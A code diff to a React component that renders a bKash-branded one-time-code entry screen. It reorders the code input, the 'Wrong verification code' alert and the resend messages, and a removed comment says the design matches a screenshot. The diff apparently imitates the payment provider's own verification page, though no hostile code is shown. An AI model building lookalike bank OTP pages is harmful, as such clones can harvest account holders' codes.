@@ -378,55 +378,50 @@ const BkashPayment = () => {
               <>
                 {/* Pink Section - OTP Form */}
                 <div className="bg-[#E2136E] px-5 py-5 flex flex-col justify-center" style={{ height: '340px' }}>
+                  <h3 className="text-white text-center text-xs font-medium mb-3 h-4">
+                    Enter verification code sent to {getMaskedNumber()}
+                  </h3>
+                  <input
+                    ref={otpInputRef}
+                    type="tel"
+                    value={otpCode}
+                    onChange={handleOtpChange}
+                    placeholder="Enter 6 digit code"
+                    className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
+                  />
                   {showWrongOtp ? (
                     <>
-                      {/* Wrong verification code alert - matching screenshot */}
-                      <div className="flex items-center justify-center gap-2 mb-2">
-                        <svg width="18" height="16" viewBox="0 0 18 16" fill="none">
-                          <path d="M9 0L0 16h18L9 0z" fill="white" />
-                          <text x="9" y="13" textAnchor="middle" fill="#E2136E" fontSize="11" fontWeight="bold">!</text>
+                      <div className="flex items-center justify-center gap-2 mt-2">
+                        <svg width="16" height="14" viewBox="0 0 16 14" fill="none">
+                          <path d="M8 0L0 14h16L8 0z" fill="white" />
+                          <text x="8" y="11.5" textAnchor="middle" fill="#E2136E" fontSize="10" fontWeight="bold">!</text>
                         </svg>
-                        <span className="text-white text-sm font-medium">Wrong verification code</span>
+                        <span className="text-white text-xs font-medium">Wrong verification code</span>
                       </div>
+                      <p className="text-white text-center text-[10px] mt-1 underline cursor-pointer" onClick={() => { setShowWrongOtp(false); setResendTimer(30); setOtpElapsed(0); }}>
+                        Resend Code
+                      </p>
+                    </>
+                  ) : resendStatus === 'sending' ? (
+                    <p className="text-white text-center text-[10px] mt-2">
+                      Sending code to user handset ..
+                    </p>
+                  ) : resendStatus === 'sent' ? (
+                    <>
+                      <p className="text-white text-center text-[10px] mt-2 font-medium">
+                        Code sent successfully
+                      </p>
                       <p className="text-white text-center text-[10px] mt-1">
                         Resend Code in {resendTimer}s
                       </p>
                     </>
                   ) : (
-                    <>
-                      <h3 className="text-white text-center text-xs font-medium mb-3 h-4">
-                        Enter verification code sent to {getMaskedNumber()}
-                      </h3>
-                      <input
-                        ref={otpInputRef}
-                        type="tel"
-                        value={otpCode}
-                        onChange={handleOtpChange}
-                        placeholder="Enter 6 digit code"
-                        className="w-full bg-white rounded px-4 py-2.5 text-center text-gray-600 text-sm placeholder:text-gray-400 focus:outline-none focus:ring-4 focus:ring-white/40"
-                      />
-                      {resendStatus === 'sending' ? (
-                        <p className="text-white text-center text-[10px] mt-2">
-                          Sending code to user handset ..
-                        </p>
-                      ) : resendStatus === 'sent' ? (
-                        <>
-                          <p className="text-white text-center text-[10px] mt-2 font-medium">
-                            Code sent successfully
-                          </p>
-                          <p className="text-white text-center text-[10px] mt-1">
-                            Resend Code in {resendTimer}s
-                          </p>
-                        </>
-                      ) : (
-                        <p 
-                          className={`text-white text-center text-[10px] mt-2 ${resendTimer === 0 ? 'underline cursor-pointer hover:text-white/80' : ''}`}
-                          onClick={handleResendCode}
-                        >
-                          {resendTimer > 0 ? `Resend Code in ${resendTimer}s` : 'Resend Code'}
-                        </p>
-                      )}
-                    </>
+                    <p 
+                      className={`text-white text-center text-[10px] mt-2 ${resendTimer === 0 ? 'underline cursor-pointer hover:text-white/80' : ''}`}
+                      onClick={handleResendCode}
+                    >
+                      {resendTimer > 0 ? `Resend Code in ${resendTimer}s` : 'Resend Code'}
+                    </p>
                   )}
                 </div>
 
